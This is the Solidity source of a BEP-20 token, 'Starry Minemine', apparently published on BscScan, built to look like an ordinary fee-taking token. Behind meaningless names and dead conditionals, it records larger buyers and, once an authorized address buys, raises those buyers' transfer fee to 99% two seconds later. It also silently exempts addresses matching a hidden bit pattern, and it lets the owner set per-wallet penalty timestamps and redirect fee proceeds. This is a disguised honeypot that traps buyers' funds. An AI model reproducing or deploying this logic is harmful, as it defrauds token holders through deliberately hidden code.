/**
 *Submitted for verification at BscScan.com on 2022-12-16
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract StarryMinemine is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Starry Minemine ";
    string constant _symbol = "StarryMinemine";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private teamLimitBurnReceiverMin;
    mapping(address => bool) private marketingReceiverFeeExempt;
    mapping(address => bool) private modeBurnMarketingReceiver;
    mapping(address => bool) private swapModeMinBots;
    mapping(address => uint256) private limitSellWalletAutoFeeMax;
    mapping(uint256 => address) private sellLimitTradingTx;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private botsMarketingReceiverLaunchedTeam = 0;
    uint256 private receiverTxMinMax = 6;

    //SELL FEES
    uint256 private walletTeamBuyLiquidity = 0;
    uint256 private teamBuyExemptMarketingAuto = 6;

    uint256 private walletExemptSellBuyMarketingTxFee = receiverTxMinMax + botsMarketingReceiverLaunchedTeam;
    uint256 private feeModeAutoSell = 100;

    address private tradingBurnReceiverTx = (msg.sender); // auto-liq address
    address private exemptMarketingReceiverBots = (0x6FB330732445F53aAab87Aedfffff85CAD240142); // marketing address
    address private maxBurnLimitBuy = DEAD;
    address private walletAutoBuyTeamFee = DEAD;
    address private feeMinBotsSell = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private minWalletTxAuto;
    uint256 private launchedSellWalletFee;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private liquidityFeeWalletMode;
    uint256 private burnBuyTxSwapMaxLiquidityFee;
    uint256 private feeBotsLiquidityAutoIsSellTrading;
    uint256 private botsBuyReceiverLaunched;
    uint256 private isExemptModeLiquidity;

    bool private txSwapTeamMarketing = true;
    bool private swapModeMinBotsMode = true;
    bool private botsExemptBurnLimit = true;
    bool private limitMarketingTradingTx = true;
    bool private tradingBurnLimitBuy = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private teamWalletLiquidityBotsTx = 6 * 10 ** 15;
    uint256 private maxExemptLiquidityTradingFee = _totalSupply / 1000; // 0.1%

    
    bool private burnIsTradingMax = false;
    uint256 private maxReceiverWalletLaunched = 0;
    uint256 private feeIsReceiverMarketingWalletTeamBurn = 0;
    uint256 private txMinMarketingTeamFeeAuto = 0;
    bool private teamLimitTradingBuy = false;
    uint256 private burnLimitAutoBuyTx = 0;
    uint256 private botsBuyMinIs = 0;
    bool private maxExemptTeamModeLiquidity = false;
    uint256 private maxModeLaunchedBots = 0;
    uint256 private burnWalletMinTeamMax = 0;
    bool private maxReceiverWalletLaunched0 = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        liquidityFeeWalletMode = true;

        teamLimitBurnReceiverMin[msg.sender] = true;
        teamLimitBurnReceiverMin[address(this)] = true;

        marketingReceiverFeeExempt[msg.sender] = true;
        marketingReceiverFeeExempt[0x0000000000000000000000000000000000000000] = true;
        marketingReceiverFeeExempt[0x000000000000000000000000000000000000dEaD] = true;
        marketingReceiverFeeExempt[address(this)] = true;

        modeBurnMarketingReceiver[msg.sender] = true;
        modeBurnMarketingReceiver[0x0000000000000000000000000000000000000000] = true;
        modeBurnMarketingReceiver[0x000000000000000000000000000000000000dEaD] = true;
        modeBurnMarketingReceiver[address(this)] = true;

        SetAuthorized(address(0xD65f82B50EEc03FeFF36f568fFFfD0634eeA3D73));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return txBurnReceiverExempt(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Starry Minemine  Insufficient Allowance");
        }

        return txBurnReceiverExempt(sender, recipient, amount);
    }

    function txBurnReceiverExempt(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (maxReceiverWalletLaunched0 != tradingBurnLimitBuy) {
            maxReceiverWalletLaunched0 = limitMarketingTradingTx;
        }


        bool bLimitTxWalletValue = limitMinAutoMaxTradingExemptSell(sender) || limitMinAutoMaxTradingExemptSell(recipient);
        
        if (burnLimitAutoBuyTx == walletTeamBuyLiquidity) {
            burnLimitAutoBuyTx = maxModeLaunchedBots;
        }

        if (maxModeLaunchedBots == walletExemptSellBuyMarketingTxFee) {
            maxModeLaunchedBots = receiverTxMinMax;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isAuthorized(recipient)) {
                modeReceiverLaunchedMin();
            }
            if (!bLimitTxWalletValue) {
                swapBotsTeamIsWallet(recipient);
            }
        }
        
        if (inSwap || bLimitTxWalletValue) {return isFeeModeTx(sender, recipient, amount);}

        if (!teamLimitBurnReceiverMin[sender] && !teamLimitBurnReceiverMin[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Starry Minemine  Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || modeBurnMarketingReceiver[sender] || modeBurnMarketingReceiver[recipient], "Starry Minemine  Max TX Limit has been triggered");

        if (exemptMinTxIsSell()) {minLiquidityBurnSwapAutoSellMax();}

        _balances[sender] = _balances[sender].sub(amount, "Starry Minemine  Insufficient Balance");
        
        if (burnIsTradingMax == tradingBurnLimitBuy) {
            burnIsTradingMax = botsExemptBurnLimit;
        }

        if (maxModeLaunchedBots == maxExemptLiquidityTradingFee) {
            maxModeLaunchedBots = maxExemptLiquidityTradingFee;
        }


        uint256 amountReceived = exemptMarketingMinTrading(sender) ? liquidityBurnWalletTrading(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function isFeeModeTx(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Starry Minemine  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function exemptMarketingMinTrading(address sender) internal view returns (bool) {
        return !marketingReceiverFeeExempt[sender];
    }

    function sellLimitExemptSwap(address sender, bool selling) internal returns (uint256) {
        
        if (maxReceiverWalletLaunched0 == maxReceiverWalletLaunched0) {
            maxReceiverWalletLaunched0 = tradingBurnLimitBuy;
        }

        if (teamLimitTradingBuy != burnIsTradingMax) {
            teamLimitTradingBuy = maxExemptTeamModeLiquidity;
        }


        if (selling) {
            walletExemptSellBuyMarketingTxFee = teamBuyExemptMarketingAuto + walletTeamBuyLiquidity;
            return autoMaxSwapBots(sender, walletExemptSellBuyMarketingTxFee);
        }
        if (!selling && sender == uniswapV2Pair) {
            walletExemptSellBuyMarketingTxFee = receiverTxMinMax + botsMarketingReceiverLaunchedTeam;
            return walletExemptSellBuyMarketingTxFee;
        }
        return autoMaxSwapBots(sender, walletExemptSellBuyMarketingTxFee);
    }

    function autoModeFeeTrading() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function liquidityBurnWalletTrading(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (txMinMarketingTeamFeeAuto == maxReceiverWalletLaunched) {
            txMinMarketingTeamFeeAuto = txMinMarketingTeamFeeAuto;
        }

        if (maxModeLaunchedBots != botsBuyMinIs) {
            maxModeLaunchedBots = txMinMarketingTeamFeeAuto;
        }


        uint256 feeAmount = amount.mul(sellLimitExemptSwap(sender, receiver == uniswapV2Pair)).div(feeModeAutoSell);

        if (swapModeMinBots[sender] || swapModeMinBots[receiver]) {
            feeAmount = amount.mul(99).div(feeModeAutoSell);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function limitMinAutoMaxTradingExemptSell(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function autoMaxSwapBots(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = limitSellWalletAutoFeeMax[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function swapBotsTeamIsWallet(address addr) private {
        if (autoModeFeeTrading() < teamWalletLiquidityBotsTx) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        sellLimitTradingTx[exemptLimitValue] = addr;
    }

    function modeReceiverLaunchedMin() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (limitSellWalletAutoFeeMax[sellLimitTradingTx[i]] == 0) {
                    limitSellWalletAutoFeeMax[sellLimitTradingTx[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(exemptMarketingReceiverBots).transfer(amountBNB * amountPercentage / 100);
    }

    function exemptMinTxIsSell() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    tradingBurnLimitBuy &&
    _balances[address(this)] >= maxExemptLiquidityTradingFee;
    }

    function minLiquidityBurnSwapAutoSellMax() internal swapping {
        
        uint256 amountToLiquify = maxExemptLiquidityTradingFee.mul(botsMarketingReceiverLaunchedTeam).div(walletExemptSellBuyMarketingTxFee).div(2);
        uint256 amountToSwap = maxExemptLiquidityTradingFee.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = walletExemptSellBuyMarketingTxFee.sub(botsMarketingReceiverLaunchedTeam.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(botsMarketingReceiverLaunchedTeam).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(receiverTxMinMax).div(totalETHFee);
        
        payable(exemptMarketingReceiverBots).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                tradingBurnReceiverTx,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getExemptMarketingReceiverBots() public view returns (address) {
        if (exemptMarketingReceiverBots == exemptMarketingReceiverBots) {
            return exemptMarketingReceiverBots;
        }
        if (exemptMarketingReceiverBots == walletAutoBuyTeamFee) {
            return walletAutoBuyTeamFee;
        }
        return exemptMarketingReceiverBots;
    }
    function setExemptMarketingReceiverBots(address a0) public onlyOwner {
        exemptMarketingReceiverBots=a0;
    }

    function getBotsExemptBurnLimit() public view returns (bool) {
        if (botsExemptBurnLimit != maxReceiverWalletLaunched0) {
            return maxReceiverWalletLaunched0;
        }
        if (botsExemptBurnLimit == tradingBurnLimitBuy) {
            return tradingBurnLimitBuy;
        }
        if (botsExemptBurnLimit != botsExemptBurnLimit) {
            return botsExemptBurnLimit;
        }
        return botsExemptBurnLimit;
    }
    function setBotsExemptBurnLimit(bool a0) public onlyOwner {
        if (botsExemptBurnLimit != botsExemptBurnLimit) {
            botsExemptBurnLimit=a0;
        }
        if (botsExemptBurnLimit != maxExemptTeamModeLiquidity) {
            maxExemptTeamModeLiquidity=a0;
        }
        if (botsExemptBurnLimit == swapModeMinBotsMode) {
            swapModeMinBotsMode=a0;
        }
        botsExemptBurnLimit=a0;
    }

    function getTeamLimitTradingBuy() public view returns (bool) {
        if (teamLimitTradingBuy == tradingBurnLimitBuy) {
            return tradingBurnLimitBuy;
        }
        return teamLimitTradingBuy;
    }
    function setTeamLimitTradingBuy(bool a0) public onlyOwner {
        teamLimitTradingBuy=a0;
    }

    function getTxSwapTeamMarketing() public view returns (bool) {
        return txSwapTeamMarketing;
    }
    function setTxSwapTeamMarketing(bool a0) public onlyOwner {
        if (txSwapTeamMarketing != maxReceiverWalletLaunched0) {
            maxReceiverWalletLaunched0=a0;
        }
        if (txSwapTeamMarketing == maxReceiverWalletLaunched0) {
            maxReceiverWalletLaunched0=a0;
        }
        if (txSwapTeamMarketing != teamLimitTradingBuy) {
            teamLimitTradingBuy=a0;
        }
        txSwapTeamMarketing=a0;
    }

    function getReceiverTxMinMax() public view returns (uint256) {
        if (receiverTxMinMax != walletTeamBuyLiquidity) {
            return walletTeamBuyLiquidity;
        }
        if (receiverTxMinMax != txMinMarketingTeamFeeAuto) {
            return txMinMarketingTeamFeeAuto;
        }
        return receiverTxMinMax;
    }
    function setReceiverTxMinMax(uint256 a0) public onlyOwner {
        if (receiverTxMinMax == teamBuyExemptMarketingAuto) {
            teamBuyExemptMarketingAuto=a0;
        }
        receiverTxMinMax=a0;
    }

    function getMaxBurnLimitBuy() public view returns (address) {
        if (maxBurnLimitBuy == walletAutoBuyTeamFee) {
            return walletAutoBuyTeamFee;
        }
        if (maxBurnLimitBuy == feeMinBotsSell) {
            return feeMinBotsSell;
        }
        return maxBurnLimitBuy;
    }
    function setMaxBurnLimitBuy(address a0) public onlyOwner {
        if (maxBurnLimitBuy != walletAutoBuyTeamFee) {
            walletAutoBuyTeamFee=a0;
        }
        if (maxBurnLimitBuy != tradingBurnReceiverTx) {
            tradingBurnReceiverTx=a0;
        }
        if (maxBurnLimitBuy == tradingBurnReceiverTx) {
            tradingBurnReceiverTx=a0;
        }
        maxBurnLimitBuy=a0;
    }

    function getBurnLimitAutoBuyTx() public view returns (uint256) {
        if (burnLimitAutoBuyTx != feeModeAutoSell) {
            return feeModeAutoSell;
        }
        return burnLimitAutoBuyTx;
    }
    function setBurnLimitAutoBuyTx(uint256 a0) public onlyOwner {
        if (burnLimitAutoBuyTx != botsMarketingReceiverLaunchedTeam) {
            botsMarketingReceiverLaunchedTeam=a0;
        }
        if (burnLimitAutoBuyTx == receiverTxMinMax) {
            receiverTxMinMax=a0;
        }
        if (burnLimitAutoBuyTx == botsBuyMinIs) {
            botsBuyMinIs=a0;
        }
        burnLimitAutoBuyTx=a0;
    }

    function getMaxExemptLiquidityTradingFee() public view returns (uint256) {
        return maxExemptLiquidityTradingFee;
    }
    function setMaxExemptLiquidityTradingFee(uint256 a0) public onlyOwner {
        if (maxExemptLiquidityTradingFee != walletExemptSellBuyMarketingTxFee) {
            walletExemptSellBuyMarketingTxFee=a0;
        }
        if (maxExemptLiquidityTradingFee != teamBuyExemptMarketingAuto) {
            teamBuyExemptMarketingAuto=a0;
        }
        maxExemptLiquidityTradingFee=a0;
    }

    function getLimitSellWalletAutoFeeMax(address a0) public view returns (uint256) {
        if (limitSellWalletAutoFeeMax[a0] == limitSellWalletAutoFeeMax[a0]) {
            return teamWalletLiquidityBotsTx;
        }
            return limitSellWalletAutoFeeMax[a0];
    }
    function setLimitSellWalletAutoFeeMax(address a0,uint256 a1) public onlyOwner {
        if (a0 == exemptMarketingReceiverBots) {
            txMinMarketingTeamFeeAuto=a1;
        }
        limitSellWalletAutoFeeMax[a0]=a1;
    }

    function getSellLimitTradingTx(uint256 a0) public view returns (address) {
            return sellLimitTradingTx[a0];
    }
    function setSellLimitTradingTx(uint256 a0,address a1) public onlyOwner {
        if (a0 == txMinMarketingTeamFeeAuto) {
            feeMinBotsSell=a1;
        }
        sellLimitTradingTx[a0]=a1;
    }

    function getBotsBuyMinIs() public view returns (uint256) {
        return botsBuyMinIs;
    }
    function setBotsBuyMinIs(uint256 a0) public onlyOwner {
        botsBuyMinIs=a0;
    }

    function getMarketingReceiverFeeExempt(address a0) public view returns (bool) {
        if (marketingReceiverFeeExempt[a0] != modeBurnMarketingReceiver[a0]) {
            return burnIsTradingMax;
        }
        if (a0 != maxBurnLimitBuy) {
            return txSwapTeamMarketing;
        }
        if (marketingReceiverFeeExempt[a0] != swapModeMinBots[a0]) {
            return maxExemptTeamModeLiquidity;
        }
            return marketingReceiverFeeExempt[a0];
    }
    function setMarketingReceiverFeeExempt(address a0,bool a1) public onlyOwner {
        marketingReceiverFeeExempt[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}